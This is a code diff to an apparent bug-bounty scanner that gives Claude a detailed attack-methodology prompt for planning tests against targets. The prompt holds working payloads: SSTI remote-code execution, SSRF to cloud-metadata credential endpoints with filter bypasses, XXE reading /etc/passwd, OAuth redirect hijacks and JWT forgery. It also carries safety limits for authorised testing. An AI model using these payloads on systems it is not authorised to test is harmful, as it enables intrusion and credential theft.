@@ -201,8 +201,7 @@ def _finding(module: str, test_name: str, severity: str, title: str,
     }
 
 
-def _sse(event: str, data: dict) -> str:
-    return f"event: {event}\ndata: {json.dumps(data)}\n\n"
+from app.core.sse import sse_event as _sse
 
 
 def _probe(module: str, method: str, url: str, *,
@@ -824,64 +823,133 @@ def _cookies_to_header(cookies: dict[str, str]) -> str:
 
 # ── AI Strategy Planner ───────────────────────────────────────────────────────
 
-# Condensed hunt skill techniques used as Claude context
+# Hunt Harness methodology used as Claude context — condensed from the operator's
+# Hunt Harness multi-agent engine (hunt-recon-mapper, hunt-access-control,
+# hunt-ssrf, hunt-injection, hunt-auth-session, hunt-client-side, hunt-business-logic,
+# hunt-infra-supply hunters + hunt-triage-verifier false-positive gate).
 _HUNT_SKILL_CONTEXT = """
-HUNT SKILL TECHNIQUES (from bug bounty research):
+HUNT HARNESS METHODOLOGY (bug-bounty tradecraft, weighted by what actually gets paid 2022-2025):
 
-HTTP Request Smuggling:
-- CL.TE: send Content-Length + Transfer-Encoding; backend uses TE, frontend uses CL
-- TE.CL: reverse — frontend TE, backend CL
-- CL.0: backend ignores CL header entirely (common in static file servers & CDNs)
-- Detection: timing oracle — 5s+ delay on poisoned smuggled request confirms desync
-- High-value targets: load balancers, reverse proxies, CDN edges, API gateways
+PRIORITY ORDER (hunt these first — highest yield):
+RCE/cmdi > SSRF-to-cloud-metadata-creds > auth bypass / any-account takeover >
+mass/bulk PII (often auto-Critical, easier than RCE) > CSRF-on-ATO, write/delete IDOR,
+stored-XSS-to-admin, SQLi extraction, JWT/OAuth ATO > read-IDOR, reflected-XSS-with-reach,
+open-redirect+OAuth, race conditions, CORS+ACAC chains.
+Rising & paid: authorization bugs (IDOR/BOLA/BFLA), ATO chains, SSRF-to-cloud,
+business-logic races, request smuggling, AI/LLM prompt-injection (+540% reports).
+Falling reward but still P1: commodity reflected XSS, classic SQLi.
 
-CRLF Injection:
-- Inject %0d%0a in redirect params (redirect=, url=, next=, return=) to split HTTP response
-- XSS via response splitting: inject fake Content-Type + script body
-- Log poisoning: inject in User-Agent, X-Forwarded-For headers
-- Bypasses CSP script-src 'self' — injected content is served from same origin
+HIGHEST-YIELD, CHEAPEST TESTS (run these against every target):
+1. IDOR method-swap: re-test every "protected" GET as PUT/DELETE/PATCH/POST — write-method
+   BOLA is ~46% of confirmed cases.
+2. ID wrapping/encoding bypass: {"id":[123]}, {"id":{"id":123}}, HPP id=yours&id=victim.
+   GraphQL global IDs: base64-decode -> increment -> re-encode (Base64("User:1337")).
+3. Tenant fuzz: inject/alter org_id/team_id/account_id/workspace in body & headers.
+4. Mass assignment: add role=admin, isAdmin=true, is_staff=true, plan=enterprise,
+   verified=true, owner/user_id/from to write requests; diff GET response fields vs
+   what PUT/POST accepts.
+5. Single-packet race: for redeem/withdraw/vote/coupon/invite flows, fire 20-30 requests
+   in one burst (last-byte-sync) — turned limit-overruns into six-figure findings.
 
-HTTP Parameter Pollution:
-- Duplicate params: id=legitimate&id=victim — backend may use last, WAF checks first
-- ACL IDOR bypass: /api/transfer?from=victim&from=attacker&amount=1000
-- WAF bypass: ?search=safe&search=<script> — WAF sees first, app processes second
-- PHP uses last value, Node/Express arrays, ASP.NET first value
+SSRF -> CLOUD METADATA (exact targets):
+- AWS IMDSv1: http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE>;
+  /latest/user-data. IMDSv2 needs PUT /latest/api/token (X-aws-ec2-metadata-token-ttl-seconds)
+  then GET with X-aws-ec2-metadata-token — a GET-only SSRF cannot complete IMDSv2, so
+  webhook/smuggling primitives are the top-value chains. ECS/EKS: 169.254.170.2/v2/credentials.
+- GCP: metadata.google.internal/computeMetadata/v1/... (Metadata-Flavor: Google).
+  Azure: 169.254.169.254/metadata/identity/oauth2/token (Metadata: true).
+- Bypasses: decimal 2852039166, hex 0xA9FEA9FE, [::ffff:169.254.169.254], nip.io,
+  127.1/0/0177.0.0.1; DNS rebinding (the primary 2024-25 allowlist bypass);
+  redirect-based (allowed host 302 -> metadata); gopher:// for blind Redis/SMTP pivots.
 
-SAML Attacks:
-- Signature wrapping: move SignedInfo to different subtree, attacker controls assertions
-- XXE in SAMLResponse: <!ENTITY xxe SYSTEM "file:///etc/passwd">
-- Unsigned assertion: remove ds:Signature — some IdPs accept without validation
-- Attribute pollution: inject extra attributes after signed block
+SSTI (fingerprint -> RCE):
+{{7*7}} -> 49; {{7*'7'}} -> 7777777 = Jinja2, -> 49 = Twig; ${{7*7}} Freemarker/Spring-EL;
+#{{7*7}} Thymeleaf; <%= 7*7 %> ERB; @(7*7) Razor. RCE: Jinja2
+{{cycler.__init__.__globals__.os.popen('id').read()}}; Twig {{['id']|filter('system')}};
+Thymeleaf ${{T(java.lang.Runtime).getRuntime().exec('id')}}.
 
-WebSocket / CSWSH:
-- Cross-Site WebSocket Hijacking: ws:// endpoint accepts cross-origin connections
-- Test: connect from attacker origin — if handshake succeeds without CSRF token = vulnerable
-- Subprotocol abuse: negotiate different subprotocol to bypass auth checks
-- Common endpoints: /socket.io/, /ws, /websocket, /cable, /hub, /signalr
+HTTP REQUEST SMUGGLING (2025 frontier):
+CL.TE / TE.CL / TE.TE classics, plus CL.0 and 0.CL (need an early-response gadget —
+static file, IIS reserved names /con /nul), double-desync (0.CL->CL.0), Expect-based
+desync (Expect: 100-continue, obfuscated "Expect: y 100-continue" bypasses filters).
+HTTP/2 downgrade: H2.CL (false content-length), H2.TE (ALB-accepted transfer-encoding),
+CRLF in h2 header values. Prove with a poisoned response to a canary request, never
+real users. High-value targets: load balancers, reverse proxies, CDN edges, API gateways.
 
-JWT Attacks:
-- alg:none — set algorithm to "none", strip signature
-- RS256→HS256 confusion: sign with public key using HS256 when server expects RS256
-- Weak secrets: brute-force with jwt-cracker / hashcat
-- kid injection: "kid": "../../dev/null" or SQL in kid claim
+XSS — MODERN BYPASS CHAINS:
+Mutation XSS/DOMPurify: namespace-confusion payloads survive sanitize-then-reserialize
+(CVE-2024-45801 chains prototype pollution of the depth-counter -> sanitizer bypass).
+CSP bypass: whitelisted-host JSONP (&jsonp=alert(1)//), AngularJS orderBy sandbox escape,
+DOM clobbering under strict-dynamic, <base href> hijack when base-uri is unset, nonce reuse.
+postMessage: loose *.domain.com origin regex + reflected sink + no-CSP static asset +
+DOM-clobbering gadget = XSS on the real origin.
 
-Mass Assignment:
-- Send extra fields in PUT/PATCH: {"role":"admin","isAdmin":true}
-- Look for user registration and profile update endpoints
-- Compare fields in GET response vs POST/PUT — undocumented writable fields
+OAUTH / JWT / ATO PRIMITIVES:
+- redirect_uri: path-traversal .../callback/../attacker, victim.com@attacker.com,
+  victim.com.attacker.com, attacker.com#@victim.com, param pollution
+  redirect_uri=legit&redirect_uri=attacker.
+- Missing "state" -> forced account-linking CSRF. Leak code/token via Referer from the
+  callback page. Pre-ATO: register victim email before IdP use; RP not checking
+  email_verified/aud.
+- JWT: alg:none (strip signature), RS256->HS256 confusion (HMAC-sign with the public
+  key), jku/jwks injection, kid path-traversal/SQLi, weak secret brute-force.
+- Password reset: host-header poisoning (Host/X-Forwarded-Host/dup Host -> attacker
+  link), token in body/Referer, email param injection email=victim&email=attacker,
+  response manipulation (403->200), predictable/non-invalidated tokens.
+  2FA bypass: response replay, missing OTP rate-limit, race, backup-code IDOR, CSRF on
+  disable-2FA.
 
-IDOR Patterns:
-- REST: /api/users/{id}, /api/orders/{id}, /api/messages/{id}
-- Sequential IDs: try id-1, id+1, id*2
-- UUID prediction: UUIDv1 contains timestamp — predictable
-- Hash IDs: MD5/SHA of email or username — enumerate from user list
+CRLF INJECTION / HTTP PARAMETER POLLUTION:
+- CRLF: inject %0d%0a in redirect/url/next/return params to split the HTTP response;
+  log poisoning via User-Agent/X-Forwarded-For.
+- HPP: duplicate params (id=legitimate&id=victim) — backend may use last, WAF checks
+  first; PHP uses last value, Node/Express arrays, ASP.NET first value.
+
+SAML ATTACKS:
+Signature wrapping (move SignedInfo to a different subtree), XXE in SAMLResponse
+(<!ENTITY xxe SYSTEM "file:///etc/passwd">), unsigned-assertion acceptance, attribute
+pollution after the signed block.
+
+WEBSOCKET / CSWSH:
+Cross-Site WebSocket Hijacking — connect from an attacker origin; if the handshake
+succeeds without a CSRF token, it's vulnerable. Common endpoints: /socket.io/, /ws,
+/cable, /hub, /signalr.
+
+CHAIN PATTERN (low + low = critical — always look for the second link):
+A self-only/attacker-only primitive (self-XSS, header reflection, open redirect, CRLF,
+internal SSRF) + a delivery/scope amplifier (CSRF, CDN caching, OAuth redirect,
+wildcard cookie scope, over-permissioned cloud identity) removes the self-only
+constraint. Real chains: self-XSS+login-CSRF->ATO; open-redirect+OAuth->ATO;
+reset-token-Referer-leak->ATO; IDOR-edit-email+reset->ATO; SSRF+GCP-metadata+kubelet->
+cluster RCE.
+
+FALSE-POSITIVE GATE (do not call it confirmed unless it clears this):
+XSS = payload actually executes (not reflected-but-encoded, not self-XSS with no
+delivery). SQLi = 2+ techniques agree, or one extracted value, or timing repeated x3
+vs baseline. SSRF = Collaborator DNS+HTTP hit from the target's IP, or metadata body
+returned (not client-side fetch). IDOR/BOLA = cross-account read/write of another
+user's data proven with two independent sessions. CORS = ACAO reflects attacker origin
+AND ACAC:true AND sensitive data AND SameSite=None. Open redirect = final Location is
+an attacker-controlled external host. SSTI = arithmetic actually evaluates. cmdi/RCE =
+benign command output or OOB DNS with a unique token. Race/business-logic = the
+limit-violating end state is reached with before/after proof. Timing-only oracles are
+the #1 false positive — never trust a single spike, and downgrade any signal against a
+CDN-fronted host.
+
+SAFETY (hard stops — read-confirm, never execute destructively):
+Only authorized targets. Never delete/corrupt data. Never modify data without an
+immediate revert. Never exfiltrate PII at scale (2-3 masked samples prove a bulk-PII
+bug). Never complete a real purchase/transfer/message as a real user. RCE proof is one
+benign command (id/whoami) — no persistence, no lateral movement. Write/delete IDOR is
+reported as "impact assessed, not executed" with the exact request, not by actually
+performing the destructive action.
 """
 
 
 async def _ai_plan_attack(target: str, tech_stack: list[str],
                           endpoints: list[str], modules: list[str],
                           ai_config: dict | None = None) -> str:
-    """Use Claude to generate a prioritised attack strategy using hunt skill context.
+    """Use Claude to generate a prioritised attack strategy using Hunt Harness context.
 
     Raises RuntimeError if API key is not configured.
     Raises any Anthropic API exception so the caller can emit a proper SSE error event.
@@ -899,10 +967,11 @@ async def _ai_plan_attack(target: str, tech_stack: list[str],
     model = cfg.get("model") or settings.AI_MODEL
 
     system_prompt = (
-        "You are an expert penetration tester and bug bounty hunter. "
-        "You have deep knowledge of advanced web security techniques from real bug bounty reports. "
+        "You are an expert penetration tester and bug bounty hunter operating the Hunt "
+        "Harness methodology. You have deep knowledge of advanced web security techniques "
+        "from real bug bounty reports, weighted by what actually gets paid. "
         "Be concise, specific, and actionable. Focus only on high-impact, exploitable findings. "
-        "Reference the hunt skill techniques below when relevant.\n\n"
+        "Reference the Hunt Harness methodology below when relevant.\n\n"
         + _HUNT_SKILL_CONTEXT
     )
 
@@ -916,7 +985,7 @@ MODULES RUNNING: {', '.join(modules)}
 Provide:
 1. Top 3 most likely high-impact vulnerabilities for this specific tech stack (with reasoning)
 2. Which endpoints to prioritise and why (reference actual endpoints above)
-3. Specific hunt skill techniques most applicable to this target
+3. Specific Hunt Harness techniques most applicable to this target
 4. Any unusual attack angles given the tech stack (e.g., framework-specific quirks)
 
 Max 250 words. Be specific — reference actual endpoints and tech detected above."""
@@ -953,7 +1022,7 @@ async def _ai_analyze_finding(finding: dict, target: str, ai_config: dict | None
             f"Severity: {finding.get('severity')}\n"
             f"Evidence: {str(finding.get('evidence', ''))[:300]}\n\n"
             "In 2-3 sentences: what is the real-world impact and what is the fastest "
-            "exploitation path? Reference any relevant hunt skill technique."
+            "exploitation path? Reference any relevant Hunt Harness technique."
         )}],
     )
     return msg.content[0].text.strip()
